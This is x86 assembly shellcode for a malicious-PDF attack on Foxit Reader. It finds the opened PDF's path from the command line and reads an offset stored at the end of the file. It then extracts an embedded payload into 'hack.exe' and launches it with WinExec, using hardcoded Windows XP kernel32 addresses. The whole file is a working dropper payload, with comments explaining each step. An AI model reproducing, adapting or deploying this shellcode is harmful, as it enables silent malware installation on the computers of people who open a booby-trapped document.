[BITS 32]
push ebp
mov ebp,esp
sub esp, 0x88								;128+8
PUSH 0x00202020					;push the string of "hack.exe"
PUSH 0x6578652e
PUSH 0x6b636168
sub esp,0x8 					;for two handlers 

;when you double click the pdf, the GetCommandLineW() return "...Foxit Reader.exe"blankblank"...\**.pdf"
;we need to remove the " in the end of the path
mov 	eax, 0x7c81771b			;GetCommandLineW()
call 	eax
mov 	ebx, eax
branch2:inc ebx


mov 	eax,0x00200022 			;egg=". .
mov 	edi,ebx
scasd							;edi=edi+4
jnz		branch2
inc		edi
inc 	edi
xor 	eax,eax
mov 	al, [byte edi]
cmp 	eax, '"'
jnz		branch3
inc 	edi
inc 	edi
mov 	[ebp-0x4], edi			;put the path to [ebp-0x4]
branch4:

mov		ax, 0x0022
scasw							;edi = edi+2
jnz		branch4
xor 	ebx,ebx
mov 	word [edi-0x2], bx		;remove the " in the end of the path.

;while [0x7d7a4878] is unicode when you first start up foxit reader then you open the pdf.

branch3:mov edx, [ebp-0x4]
;mov edx, 0x00152352
mov ebx, edx
test ebx,ebx
jnz create
mov edx, 0x7d7a4878

create:xor eax, eax
push eax                                   ; /hTemplateFile = NULL
push eax                                   ; |Attributes = 0
push 0x3                                   ; |Mode = OPEN_EXISTING
push eax                                   ; |pSecurity = NULL
push 0x1   								   ; |ShareMode = FILE_SHARE_READ
                             
mov ecx, 0x6EEEEEEF
ADD ECX,0x11111111
push ecx  

                          			; push 0x80000000 Access = GENERIC_READ
push edx                   ; the path of pdf(unicode) ####the address is point to the path in the memory

;push ebp 					;push the path of pdf   For Test
;mov eax,0x7c801a28			;CreateFileA, because the path of the pdf is ASCII  ######For test
mov eax,0x7c810cd9			;CreateFileW, the path of pdf is unicode
call eax                                 ; 
;mov eax, [0x017c1f84]		;file handler
mov esi, eax
mov [ebp-0x98], eax			;put the handler to [ebp-0x98]

							
xor ebx,ebx
push 0x2                                   ; /Origin = FILE_END
push ebx                                  ; |pOffsetHi = NULL
push -8                                  ; |OffsetLo = FFFFFFF8 (-8.)
push esi                                 ; |hFile
mov ebx,0x7c811106
call ebx								; \\\\\\\\\\\\\\\\SetFilePointer

mov esi, [ebp-0x98]
xor eax,eax
push eax                              ; /pOverlapped = NULL
lea ecx,[ebp-4]                         ; |
push ecx                                 ; |pBytesRead
push 8                                   ; |BytesToRead = 8
lea ebx,[ebp-0x88]                     ; |
push ebx                                 ; |Buffer
push esi                                 ; |hFile
mov [ebp-4],eax             			;dwReadSize=0
mov eax,0x7c801812
call eax                                 ;  \\\\\\\\\\\\\\\\\ReadFile

lea eax,[ebp-0x88]
push eax  
mov eax, 0x77bebf18                             ; /s
call eax     								; \\\\\\\\\\\\\\\\\\atoi
add esp,4

mov esi, [ebp-0x98]
xor ecx,ecx
push ecx                                   ; /Origin = FILE_BEGIN
push ecx                                 ; |pOffsetHi = NULL
push eax                                 ; |OffsetLo
push esi                                 ; |hFile
mov eax,0x7c811106
call eax								; \\\\\\\\\\\\\\\\\\SetFilePointer

xor eax,eax							
push eax
push eax
push 2
push eax
push eax
push 0xC0000000
lea ecx, [ebp-0x94]
push ecx        						;  "hack.exe"
mov [ebp-0x8],eax
mov eax, 0x7c801a28
call eax 								 ;	\\\\\\\\\\\\\\\\\\CreateFileA #####eax=hFiletoWrite

mov ebx,eax								;####ebx=hFiletoWrite
mov [ebp-0x9c], eax					;put the handler to [ebp-0x9c]
mov esi, [ebp-0x98]
xor edi,edi
push edi
lea ecx,[ebp-4]
push ecx
push 0x80
lea edx, [ebp-0x88]
push edx
push esi
mov eax, 0x7c801812
call eax					;\\\\\\\\\\\\\\\\\\ReadFile
test eax,eax
je short end

begin:xor eax,eax
mov ebx, [ebp-0x9c]

push eax                                  ; /pOverlapped = NULL
lea eax, [ebp-0x8]                     ; |
push eax                                ; |pBytesWritten
push 0x80                               ; |nBytesToWrite = 0x80 (.)
lea ecx,[ebp-0x88]                    ; |
push ecx                                ; |Buffer
push ebx                                ; |hFiletoWrite
mov eax,0x7c8112ff
call eax						; \\\\\\\\\\\\\\\\\\\WriteFile
cmp DWORD [ebp-0x4], 0x80
jb short end

mov esi, [ebp-0x98]
xor edi,edi
push edi
lea edx,[ebp-0x4]
push edx
push 0x80
lea eax,[ebp-0x88]
push eax
push esi
mov eax, 0x7c801812
call eax							; ReadFile
test eax,eax
jnz short begin
end:mov edi,0x7c809be7					 ;  kernel32.CloseHandle
mov ebx, [ebp-0x98]
push ebx                                 ; /hObject
call edi                                 ; \CloseHandle
mov esi, [ebp-0x9c]
push esi                                 ; /hObject
call edi                                 ; \CloseHandle

;xor edi,edi
PUSH 0x1   							; /ShowState 
lea ecx, [ebp-0x94]
push ecx                      		; |CmdLine = "hack.exe"          
mov eax,0x7c862585
CALL eax							; \WinExec

add esp, 0x9c
;mov esp,ebp
pop ebp
;retn

